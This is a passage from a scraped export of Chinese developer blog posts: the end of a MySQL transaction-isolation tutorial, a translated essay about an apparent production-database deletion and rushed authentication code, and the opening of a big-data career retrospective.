(<strong>count=1</strong>)</td>\n<td></td>\n</tr>\n<tr>\n<td>update Tran_test set count=count-1 where id=1;</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>select * from Tran_test where id=1;<strong>(count=0)</strong></td>\n</tr>\n<tr>\n<td>select * from Tran_test;<strong>(count=0)</strong></td>\n<td></td>\n</tr>\n<tr>\n<td>roll back;</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>commit;</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p>可以看到，事务B读取到了事务A未提交的数据，它任务抽奖活动已经结束。但如果此时事务A回滚，count仍然为1，则活动实际是未结束的，这就是<strong>脏读</strong>。因此，实际中，一般不会采用这种隔离级别。</p>\n<h3><strong>提交读</strong></h3>\n<p>提交读隔离级别可以解决上述脏读问题，其只能读到其他事务已经提交的数据。</p>\n<p>更改数据库隔离级别：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b626a6021237027503490\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSET GLOBAL TRANSACTION ISOLATION LEVEL READ COMMITTED;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b626a6021237027503490-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b626a6021237027503490-1\"><span class=\"crayon-e\">SET </span><span class=\"crayon-m\">GLOBAL</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">TRANSACTION </span><span class=\"crayon-e\">ISOLATION </span><span class=\"crayon-e\">LEVEL </span><span class=\"crayon-e\">READ </span><span class=\"crayon-v\">COMMITTED</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<table cellspacing=\"1\" cellpadding=\"1\">\n<tbody>\n<tr>\n<td>事务A</td>\n<td>事务B</td>\n</tr>\n<tr>\n<td>start transaction;</td>\n<td>start transaction;</td>\n</tr>\n<tr>\n<td>select * from Tran_test where id=1; (<strong>count=1</strong>)</td>\n<td></td>\n</tr>\n<tr>\n<td>update Tran_test set count=count-1 where id=1;</td>\n<td></td>\n</tr>\n<tr>\n<td>select * from Tran_test;<strong>(count=0)</strong></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>select * from Tran_test where id=1;<strong>(count=1)</strong></td>\n</tr>\n<tr>\n<td>commit;</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>select * from Tran_test where id=1;<strong>(count=0)</strong></td>\n</tr>\n<tr>\n<td></td>\n<td>commit</td>\n</tr>\n</tbody>\n</table>\n<p>可以看到，在事务A提交前的改动，事务B是读取不到的。只有A事务提交后，B才能读取到事务A的改动。</p>\n<p>我们看到，在事务B中，先后两次读取，count的值是不一样的，这就是<strong>不可重复读。</strong>而<strong>可重复读</strong>隔离级别可以解决这个问题<strong>。</strong></p>\n<h3><strong>可重复读</strong></h3>\n<p>更改数据库隔离级别：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b626a602123b434185612\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nSET GLOBAL TRANSACTION ISOLATION LEVEL REPEATABLE READ;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b626a602123b434185612-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b626a602123b434185612-1\"><span class=\"crayon-e\">SET </span><span class=\"crayon-m\">GLOBAL</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">TRANSACTION </span><span class=\"crayon-e\">ISOLATION </span><span class=\"crayon-e\">LEVEL </span><span class=\"crayon-e\">REPEATABLE </span><span class=\"crayon-v\">READ</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p> </p>\n<table cellspacing=\"1\" cellpadding=\"1\">\n<tbody>\n<tr>\n<td>事务A</td>\n<td>事务B</td>\n</tr>\n<tr>\n<td>start transaction;</td>\n<td>start transaction;</td>\n</tr>\n<tr>\n<td>select * from Tran_test where id=1; (<strong>count=1</strong>)</td>\n<td></td>\n</tr>\n<tr>\n<td>update Tran_test set count=count-1 where id=1;</td>\n<td></td>\n</tr>\n<tr>\n<td>select * from Tran_test;<strong>(count=0)</strong></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>select * from Tran_test where id=1;<strong>(count=1)</strong></td>\n</tr>\n<tr>\n<td>commit;</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>select * from Tran_test where id=1;<strong>(count=1)</strong></td>\n</tr>\n<tr>\n<td></td>\n<td>commit</td>\n</tr>\n</tbody>\n</table>\n<p>可以看到，不论事务A是否提交，事务B读到的count值都是不变的。这就是<strong>可重复读。</strong></p>\n<p>除了上面提到的脏读、不可重复读，还有一种情况是<strong>幻读：在事务中，前后两次查询，记录数量是不一样的。</strong></p>\n<p>比如事务B是事务A插入一条记录的前后执行查询，会发现相同的查询条件，查出来的记录数不一样。由于mysql的RR（可重复读）一并解决了幻读的问题，所以我们直接看上述场景，在mysql中的表现：</p>\n<p> </p>\n<table cellspacing=\"1\" cellpadding=\"1\">\n<tbody>\n<tr>\n<td>事务A</td>\n<td>事务B</td>\n</tr>\n<tr>\n<td>start transaction;</td>\n<td>start transaction;</td>\n</tr>\n<tr>\n<td></td>\n<td>select count(1)  from Tran_test；<strong>(1)</strong></td>\n</tr>\n<tr>\n<td>insert into Tran_test (id, count) value (2,2);</td>\n<td></td>\n</tr>\n<tr>\n<td>commit;</td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td>select count(1)  from Tran_test；<strong>(1)</strong></td>\n</tr>\n<tr>\n<td></td>\n<td>commit</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n</tr>\n</tbody>\n</table>\n<p>可见，在事务A提交前后，事务B查询的结果数量是一直的，并没有出现幻读的情况。</p>\n<h2>一点思考</h2>\n<p>下面默认都是讨论的msyql RR隔离级别的情况。</p>\n<p>如果两个用户同时抽奖，而且同时中奖。两者都进入了中奖的事务。A事务扣减了奖品数量，B也执行了扣减数量。假设奖品数量是N，如果是可重复读，那么，如果两个事务并行进行，那么不论A有没有提交，B读到的数量都是N，执行后为N-1，而事务A也是N-1，这样不就有问题了吗？我们期望的是N-2。</p>\n<p>当初这个问题让我很困惑。这反应了当时我对数据库锁和快照读、当前读两个知识点的欠缺。</p>\n<h3><strong>快照读、当前读</strong></h3>\n<p>将设事务A已经提交，由于是可重复读，那事务B读到的奖品数量一致是N，执行-1，数据变成N-1，而不是我们期望的N-2。</p>\n<p>如果理解了快照读和当前读的概念，上面的困惑就不会存在了。</p>\n<p>在事务中，执行普通select查询之后，会创建快照，后面再执行相同的select语句时，查询的其实是前面生成的快照。这也就是为什么会有可重复读。</p>\n<p>而如果执行</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b626a6021240132836982\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nselect * from table where ? lock in share mode;\r\nselect * from table where ? for update;\r\ninsert into table values (…); \r\nupdate table set ? where ?; \r\ndelete from table where ?;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b626a6021240132836982-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b626a6021240132836982-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b626a6021240132836982-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b626a6021240132836982-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b626a6021240132836982-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b626a6021240132836982-1\"><span class=\"crayon-e \">select *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">table </span><span class=\"crayon-i\">where</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lock </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">share </span><span class=\"crayon-v\">mode</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b626a6021240132836982-2\"><span class=\"crayon-e \">select *</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">table </span><span class=\"crayon-i\">where</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">update</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b626a6021240132836982-3\"><span class=\"crayon-e\">insert </span><span class=\"crayon-e\">into </span><span class=\"crayon-e\">table </span><span class=\"crayon-e\">values</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span>…<span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b626a6021240132836982-4\"><span class=\"crayon-e\">update </span><span class=\"crayon-e\">table </span><span class=\"crayon-i\">set</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">where</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5b626a6021240132836982-5\"><span class=\"crayon-e\">delete </span><span class=\"crayon-e\">from </span><span class=\"crayon-e\">table </span><span class=\"crayon-i\">where</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p>会执行当前读，获取最新数据。回到前面的问题，如果事务B执行N-1操作，会触发当前读，读取事务A提交后的数据，也就是N-1，在此基础上执行-1操作，最终N变成N-2。</p>\n<h3>并发更新</h3>\n<p>上面解决了事务A已经提交的额情况。但如果事务A更新奖品数量后但还未提交呢？此时事务B执行当前读拿到的也是N啊。了解数据库锁机制的话，就不会有这种困惑了。事务A提交前，会一直持有排他锁（具体是行锁还是表锁，要看查询条件有没有走索引），此时事务B更新是会阻塞的。也就是说，只有事务A提交，或回滚之后，事务B才能获得排它锁，从而进行更新奖品的操作。</p>\n<p> </p>\n<p>关于数据库的锁，大家可以参考这篇文章：http://hedengcheng.com/?p=771</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114241\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114241votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114241\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/35011d6168be00e949624c665041dc724e3ad786.jpg"},{"url_object_id": "6ef1af433054de7bb42416cdfc0fbfd8", "title": ["我作为开发者犯过的两次愚蠢的错误"], "url": "http://blog.jobbole.com/114164/", "create_date": "2018/06/29", "front_image_url": ["http://wx3.sinaimg.cn/mw690/7cc829d3gy1fsrtjp2o93j20hs0audih.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "职场, 程序员, 职场", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/dimple11\">dimple11</a> 翻译，<a href=\"http://www.jobbole.com/members/liuchang\">刘唱</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://medium.freecodecamp.org/the-times-ive-messed-up-as-a-developer-3c0bcaa1afd6\">Zachary Kuhn</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>上周我和同事们简单地聊了聊我们工作中搞砸的那些事儿。如今早已不再犯那些错了，所以想起过去就觉得很好笑。但是笑归笑，其实当时犯的这些错让我们受益颇深。</p>\n<p><img class=\"alignnone aligncenter\" src=\"http://wx3.sinaimg.cn/mw690/7cc829d3gy1fsrtjp2o93j20hs0audih.jpg\" width=\"640\" height=\"390\"></p>\n<p style=\"text-align: center;\">（credit：Snecx）</p>\n<p>分享自己犯错的经历至关重要，能让别人从中吸取经验教训，而且可能让他们工作起来更上手。我在这儿记录了几条自己最近犯的错。</p>\n<h3>为什么有那么多生产数据库被误删？</h3>\n<p>几个月之前，Reddit 上发了一篇<a href=\"https://www.reddit.com/r/cscareerquestions/comments/6ez8ag/accidentally_destroyed_production_database_on/\">文章</a>，写的是一个入门级开发人员在上班第一天就误删了生产数据库。我们看到类似这种有人犯了特大的、不可磨灭的错误的文章，都不免心生畏惧。我们意识到自己并不是没可能犯那种错——大多数时候都是悬崖勒马。</p>\n<p>我在干第一份工作的时候，有一个高级数据库管理员在上班第一天就误删了生产数据库，这种例子简直比比皆是。工作团队用一周前旧的数据库备份帮他弥补了过失，让他保住了工作。如今十年过去了，都仍用这件事拿他开涮。</p>\n<p>今年年初有天早上，我被叫去调查一个客户生产中出现的问题。他们本来要针对一小部分用户进行产品的 β 测试，但是他们的网站首页突然什么都显示不出来了。我猜想可能是系统有 bug 或者有漏洞所致。</p>\n<p>我登录进生产机器，调出数据库，发现 articles 表是空的。OK，这证实了网页显示空白的情况。</p>\n<p>用户表里面还是有用户的，这就奇怪了，所以我们丢了所有的 articles，但起码他们的测试用户仍有他们的账号，我们可以解释说是这是个测试版，而且这种事情时有发生。</p>\n<p>接下来一会儿我就犯迷糊了。我记不清楚自己干了什么，我认为自己不会蠢到在控制台窗口输入了删除表中用户的指令，可情况就是这样——现在既没有 articles 表，也没有用户表。我呆坐着，感觉有点震惊。</p>\n<p>然后我的大脑高速运转，开始想办法修复问题。我真的删掉用户表了吗？是的。我们运行备份数据库了吗？没有。该怎么向客户解释呢？我不知道。</p>\n<p>我记得自己去找了项目经理，坐在她旁边解释事情发生的经过，articles 表中没有数据了，所以网站看上去是空的。哦对了，我还误删了用户表。现在他们需要重新邀请所有的用户——如果他们还能想清楚用户都有谁的话。哎呀。</p>\n<p>我回到自己的座位上，感觉深受挫败。</p>\n<p><strong>但是我觉得事情有些蹊跷，我们怎么可能一开始就丢了所有的 articles 表呢？</strong>于是我继续深究下去，一方面是因为难以接受这个结果，一方面是想挽回颜面。之后过了一小会儿，我注意到了关键问题。</p>\n<p>服务器上还有另外 5 个数据库，其中一个的名字和我正在看的那个数据库的名字非常相似。</p>\n<p>我一检查，发现 articles 都在里面，用户表也完好无损。事实证明是因为配置发生变化，无意间让它变成了生产数据库，导致网站指向了全新的数据库。我在里面看到的那些用户呢？种子数据罢了。</p>\n<p>真是如释重负！一早上神经紧绷、胃酸翻涌，搞得我浑身不适，但好在我们“修复”了所有的数据，并且找到了问题真正的症结所在，没有提前宣布误删数据库的坏消息。</p>\n<p>这个小插曲让我们受益良多，最简单的一个就是：现在我们总是在给数据库做备份……这可能是我们开发人员最有效的胃药。</p>\n<h3>总赶进度，却从来赶不上进度</h3>\n<p>我最近所犯的另一个突出 错误没那么戏剧化，实际上是由一个个小错误最终累积造成了大麻烦。</p>\n<p>我们项目开发的一大挑战就是时间紧张（但也不全是？）</p>\n<p>第一次开会时，我们一致觉得项目需要的时间比我们能够拿出来的时间多了一倍。从项目一开始，截止日期就步步紧逼，所以我们三下五除二就通过了认证环节，以便进入客户真正关心的功能环节。</p>\n<p>我只是之前在一个单页 app 中落实了一次认证，但仍然没有彻底理解 app 各部分是如何协调的。</p>\n<p>尽己所能用最快的速度把 app 赶出来，就是大错特错，<strong>我漏掉了一些非常重要的东西：</strong></p>\n<ol>\n<li>用户在登陆后，是通过 cookie 来加载的，但是我的 app 页面没有给加载提供等待时间，而是根据事件顺序来决定先后的，所以服务器会回复说你没有权限。这种错误很少见，而且很难再出现，因为大多数情况下事件都是按照正确的顺序来完成的。</li>\n<li>而且认证环节也从不检查用户令牌是否失效，如果你不经常访问网站，当发现了没法登上网站后，就需要注销登录再重新登进去。</li>\n<li>令牌应该在每次发起请求时都进行更新，但我从来都没有时间去理解这些规则。所以这里又产生了时间问题。如果我们一次同时发出几种请求，收到的回复取决于他们到来的顺序，那将来发送请求用到的令牌就是错的。</li>\n</ol>\n<p>我们卯足劲赶进度，但最终所用的时间还是要比给定的时间多一倍。区别就是我们开发出的 app 里面漏洞更多了，然后甚而要花更多的时间对漏洞进行追踪和修复。</p>\n<p>工作中的失误让我尴尬不已，在大家面前感到十分羞愧，因为我把一切都搞砸了。</p>\n<p>我要说一点：从那之后，我开始花时间学习认证机制，现在已经理解了 OAuth,、JWT、刷新令牌和失效。我仔细阅读了许多库里别人写的认证代码，而且建立了基于几种不同语言版本和框架的认证流程。</p>\n<h3>失败是成功之母</h3>\n<p>这是每次失败的经历给予我的启发。只要你愿意学习，几乎每次这样的经历都会让你从中受益。</p>\n<p>如果人能够从错误中吸取教训，那么就会有所进步。如果一个队员是第一次犯错，我尽量不会对他表现出不满态度，他们往往已经知道自己把事情搞糟了。</p>\n<p>但我也努力不去苛责那些总是犯错、屡教不改的人，他们也需要被同情。</p>\n<p>对待犯错，如果你能够做到这四点，那么就会不断进步：</p>\n<ul>\n<li>对曾经犯过的错误可以自嘲一番</li>\n<li>从中吸取经验教训</li>\n<li>在之后努力为自己正名</li>\n<li>和他人分享，让他人也能从中获益。</li>\n</ul>\n<p>关于犯错的宝贵价值，我留给你们一则名人轶事：20 世纪初期，IBM 的总裁托马斯·J·沃森遇到了一位因为多次决策错误让公司损失惨重的员工，当问及是否要开除这个员工时，沃森答道：</p>\n<blockquote><p>“不，我刚刚花了 60 万美元培训了他，我怎么会让其他人雇佣他来获得他的经历呢？”</p></blockquote>\n<p>你过去犯过哪些有意思的错？来一起分享吧！</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114164\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114164votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114164\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11\">dimple11</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/09/28db3e36f17643a752be4b798d5ceabc.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            简介还没来得及写 :）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/dimple11\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/dimple11/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/dimple11/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 15</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/2429e83a2e9ae3455ad465bd664afe485a339128.jpg"},{"url_object_id": "d2a28d4e4a9004a7b3c4643177084415", "title": ["这两年在大数据行业中的工作总结"], "url": "http://blog.jobbole.com/114185/", "create_date": "2018/07/01", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/07/cecb3d3562d80f7f904e989de853d49d.png"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 1, "tags": "职场, 大数据", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/ztfjs/p/bigdata.html\">张泰峰</a>   </div><h2 id=\"w1\">写在前面</h2>\n<p>今年广州的六月，在经历了大雨的洗礼之后，一切都变得更加明朗起来，新的工作，新的人和事。懒惰让我变得更焦虑，焦虑促使我进步，程序员的焦虑大家应该都有共同的感觉，时代的步伐太快了，在这个环境下的软件开发一定会淘汰掉那些不懂得学习，懒惰的人。</p>\n<p>希望跟大家共勉。</p>\n<p>今天呢，博主主要回顾这两年来，在大数据行业公司从事大数据类的前端开发的工作。最近刚刚换了一份工作，把我的经验稍作总结分享给大家，有什么建议大家在评论区踊跃。 谢谢。</p>\n<p>今天的主题，主要是从大数据开发的角度，到大数据治理的必要性，再到图形化建模的畅想，最后在数据质量的把关，然后到大数据可视化的应用，博主总结两年的见闻，和我学习的成果，也不知理解有无偏差吧，希望大家能给出建议。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/cecb3d3562d80f7f904e989de853d49d.png\" alt=\"\"></p>\n<h2 